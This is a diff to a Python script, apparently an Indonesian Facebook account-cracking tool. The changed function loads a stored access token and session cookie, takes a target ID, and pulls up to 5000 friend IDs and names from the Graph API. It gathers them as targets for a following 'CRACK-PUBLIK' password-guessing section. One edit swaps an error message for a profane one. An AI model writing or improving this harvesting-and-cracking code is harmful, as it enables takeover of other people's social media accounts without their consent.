@@ -1118,30 +1118,24 @@ def file():
 def brayen_dump():
 	try:
 		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
+		kukis = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	win = '# DUMP ID PUBLIK'
-	win2 = mark(win, style='cyan')
-	sol().print(win2)
-	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
-	pil = input(x+'['+p+'f'+x+'] Masukkan ID Facebook : ')
+	cetak(panel('\t            [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
+	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID : {P}')
 	try:
-		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
-		for pi in koh2['friends']['data']:
+		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
+		for pi in koH['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
+		print('')
+		print(f' {P}[{H}+{P}]\33[1;96m Total ID yang Terkumpul : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
-		lo = mark(li, style='red')
-		sol().print(lo, style='cyan')
+		print(' [+]\33[1;91m Internet Lu Gak Ada Anjing')
 		exit()
 	except (KeyError,IOError):
-		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
-		teks2 = mark(teks, style='red')
-		sol().print(teks2)
+		print(' [+]\33[1;91m Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
 		exit()
 
 #-------------------[ CRACK-PUBLIK ]----------------#
